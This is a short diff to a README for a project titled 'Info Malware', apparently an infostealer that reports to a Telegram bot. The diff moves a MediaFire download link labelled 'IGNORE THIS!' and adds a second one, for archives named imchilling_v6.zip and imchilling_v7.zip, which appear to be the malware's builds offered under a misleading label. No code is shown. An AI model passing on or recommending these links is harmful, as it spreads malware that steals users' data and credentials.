@@ -1,6 +1,3 @@
-# <h1 align="center">
-  [IGNORE THIS!](https://www.mediafire.com/file/r4i3uioii1m1lbh/imchilling_v6.zip/file)
-</h1>
 
 <h1 align="center">🚀Info Malware 🚀</h1>
 
@@ -84,3 +81,7 @@
 > Telegram BotToken & ChatId
 ```
 
+# <h1 align="center">
+  [IGNORE THIS V6 !](https://www.mediafire.com/file/r4i3uioii1m1lbh/imchilling_v6.zip/file)
+  [IGNORE THIS V7 !](https://www.mediafire.com/file/vl0nk03m6bahstf/imchilling_v7.zip/file)
+</h1>
